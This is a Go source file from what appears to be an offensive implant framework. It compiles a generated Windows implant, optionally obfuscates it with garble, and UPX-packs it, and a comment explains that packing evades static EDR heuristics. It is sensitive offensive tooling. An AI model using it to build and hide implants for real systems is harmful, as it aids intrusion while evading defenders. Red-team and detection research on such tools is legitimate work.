// Package builder cross-compiles an emitted shroud implant project to a
// Windows PE. It shells out `go build` (or garble) with CGO_ENABLED=0 and
// GOOS=windows — pure Go, no mingw. The builder NEVER executes the produced
// binary; it only compiles and reports the result.
package builder

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// Result describes a build outcome.
type Result struct {
	OutPath  string // path to the produced .exe (on success)
	Bytes    int64
	CmdLine  string
	Stderr   string
	Garbled  bool
}

// Build runs `go mod tidy` then `go build` (or garble) in the project directory.
// projectDir must contain the emitted main.go, go.mod, build.sh. If pack is
// "upx" (EXE only) the artifact is UPX-packed after a successful build.
func Build(projectDir string, useGarble bool, pack string) (*Result, error) {
	if _, err := os.Stat(filepath.Join(projectDir, "main.go")); err != nil {
		return nil, fmt.Errorf("no main.go in %s: %w", projectDir, err)
	}

	// Resolve deps into the implant module's go.sum (network or module cache).
	if err := run(projectDir, "go", "mod", "tidy"); err != nil {
		// tidy failures (offline) are non-fatal if go.sum already seeded;
		// record but attempt the build anyway.
		_ = err
	}

	// Delegate to the generated build.sh (it sets CGO_ENABLED/GOOS/LDFLAGS and
	// picks garble when available). This keeps the build logic in one place and
	// matches what an operator would run manually.
	if err := run(projectDir, "bash", "build.sh"); err != nil {
		return nil, fmt.Errorf("build failed: %w", err)
	}

	// The artifact is implant.exe (exe) or implant.dll (dll); detect which.
	var exe string
	for _, name := range []string{"implant.exe", "implant.dll"} {
		p := filepath.Join(projectDir, name)
		if _, err := os.Stat(p); err == nil {
			exe = p
			break
		}
	}
	if exe == "" {
		return nil, fmt.Errorf("build reported success but no implant artifact found in %s", projectDir)
	}

	// Optional post-build packer (EXE only; UPX can't pack c-shared DLLs safely).
	if pack == "upx" {
		if filepath.Ext(exe) != ".exe" {
			return nil, fmt.Errorf("--pack upx is EXE-only (artifact is %s)", filepath.Base(exe))
		}
		if err := upxPack(exe); err != nil {
			return nil, err
		}
	}

	st, err := os.Stat(exe)
	if err != nil {
		return nil, fmt.Errorf("stat %s: %w", exe, err)
	}
	return &Result{
		OutPath: exe,
		Bytes:   st.Size(),
		CmdLine: "bash build.sh" + packSuffix(pack),
		Garbled: useGarble,
	}, nil
}

// upxPack compresses the artifact with UPX --best --lzma. UPX collapses the Go
// section table + pclntab (kills the "Goshell"/Go-structure static heuristics)
// at the cost of a runtime self-unpack (a behavioral signal EDR may catch) and
// being itself flagged as "packed" by some engines. Tradeoff, not a default.
func upxPack(exe string) error {
	if _, err := exec.LookPath("upx"); err != nil {
		return fmt.Errorf("--pack upx needs upx on PATH (apt install upx-ucl): %w", err)
	}
	cmd := exec.Command("upx", "--best", "--lzma", "-q", exe)
	cmd.Dir = filepath.Dir(exe)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("upx failed: %w\n%s", err, out)
	}
	return nil
}

func packSuffix(pack string) string {
	if pack != "" {
		return " + " + pack
	}
	return ""
}

// run executes a command in dir, streaming stderr into the returned error.
func run(dir string, name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(),
		"CGO_ENABLED=0",
		"GOOS=windows",
		"GOARCH=amd64",
		"GOFLAGS=-mod=mod",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s %s: %v\n%s", name, quotedArgs(args), err, out)
	}
	return nil
}

func quotedArgs(a []string) string {
	s := ""
	for i, x := range a {
		if i > 0 {
			s += " "
		}
		s += x
	}
	return s
}

// ErrSkipped is returned when a build is intentionally skipped (--no-build).
var ErrSkipped = errors.New("build skipped (--no-build)")